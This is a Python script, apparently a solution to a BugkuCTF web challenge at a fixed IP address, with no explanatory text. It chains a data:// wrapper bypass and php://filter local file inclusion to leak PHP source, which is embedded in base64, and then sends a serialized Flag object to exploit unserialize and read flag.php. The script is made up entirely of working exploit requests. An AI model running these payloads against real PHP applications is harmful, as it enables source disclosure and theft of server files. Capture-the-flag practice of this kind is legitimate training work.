import base64
import requests

target = 'http://120.24.86.145:8006/test1/'

r = requests.get(target)
print(r.content.decode())

p1 = '?txt=data://text/plain;base64,' + base64.b64encode('welcome to the bugkuctf'.encode()).decode() \
     + '&file=php://filter/read=convert.base64-encode/resource=hint.php&password='
print(target + p1)

r = requests.get(target + p1)
print(r.content.decode())

b = 'PD9waHAgIA0KICANCmNsYXNzIEZsYWd7Ly9mbGFnLnBocCAgDQogICAgcHVibGljICRmaWxlOyAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9zdHJpbmcoKXsgIA0KICAgICAgICBpZihpc3NldCgkdGhpcy0+ZmlsZSkpeyAgDQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgDQoJCQllY2hvICI8YnI+IjsNCgkJcmV0dXJuICgiZ29vZCIpOw0KICAgICAgICB9ICANCiAgICB9ICANCn0gIA0KPz4gIA== '
print(base64.b64decode(b.encode()).decode())

p2 = '?txt=data://text/plain;base64,' + base64.b64encode('welcome to the bugkuctf'.encode()).decode() \
     + '&file=php://filter/read=convert.base64-encode/resource=flag.php&password='

r = requests.get(target + p2)
print(r.content.decode())

p3 = '?txt=data://text/plain;base64,' + base64.b64encode('welcome to the bugkuctf'.encode()).decode() \
     + '&file=php://filter/read=convert.base64-encode/resource=index.php&password='

r = requests.get(target + p3)
print(r.content.decode())

b1 = 'PD9waHAgIA0KJHR4dCA9ICRfR0VUWyJ0eHQiXTsgIA0KJGZpbGUgPSAkX0dFVFsiZmlsZSJdOyAgDQokcGFzc3dvcmQgPSAkX0dFVFsicGFzc3dvcmQiXTsgIA0KICANCmlmKGlzc2V0KCR0eHQpJiYoZmlsZV9nZXRfY29udGVudHMoJHR4dCwncicpPT09IndlbGNvbWUgdG8gdGhlIGJ1Z2t1Y3RmIikpeyAgDQogICAgZWNobyAiaGVsbG8gZnJpZW5kITxicj4iOyAgDQogICAgaWYocHJlZ19tYXRjaCgiL2ZsYWcvIiwkZmlsZSkpeyANCgkJZWNobyAi5LiN6IO9546w5Zyo5bCx57uZ5L2gZmxhZ+WTpiI7DQogICAgICAgIGV4aXQoKTsgIA0KICAgIH1lbHNleyAgDQogICAgICAgIGluY2x1ZGUoJGZpbGUpOyAgIA0KICAgICAgICAkcGFzc3dvcmQgPSB1bnNlcmlhbGl6ZSgkcGFzc3dvcmQpOyAgDQogICAgICAgIGVjaG8gJHBhc3N3b3JkOyAgDQogICAgfSAgDQp9ZWxzZXsgIA0KICAgIGVjaG8gInlvdSBhcmUgbm90IHRoZSBudW1iZXIgb2YgYnVna3UgISAiOyAgDQp9ICANCiAgDQo/PiAgDQogIA0KPCEtLSAgDQokdXNlciA9ICRfR0VUWyJ0eHQiXTsgIA0KJGZpbGUgPSAkX0dFVFsiZmlsZSJdOyAgDQokcGFzcyA9ICRfR0VUWyJwYXNzd29yZCJdOyAgDQogIA0KaWYoaXNzZXQoJHVzZXIpJiYoZmlsZV9nZXRfY29udGVudHMoJHVzZXIsJ3InKT09PSJ3ZWxjb21lIHRvIHRoZSBidWdrdWN0ZiIpKXsgIA0KICAgIGVjaG8gImhlbGxvIGFkbWluITxicj4iOyAgDQogICAgaW5jbHVkZSgkZmlsZSk7IC8vaGludC5waHAgIA0KfWVsc2V7ICANCiAgICBlY2hvICJ5b3UgYXJlIG5vdCBhZG1pbiAhICI7ICANCn0gIA0KIC0tPiAg '
print(base64.b64decode(b1.encode()).decode())
print('=================================================')

p4 = '?txt=data://text/plain;base64,' + base64.b64encode('welcome to the bugkuctf'.encode()).decode() \
     + '&file=hint.php' \
     + '&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}'
r = requests.get(target + p4)
print(r.content.decode())
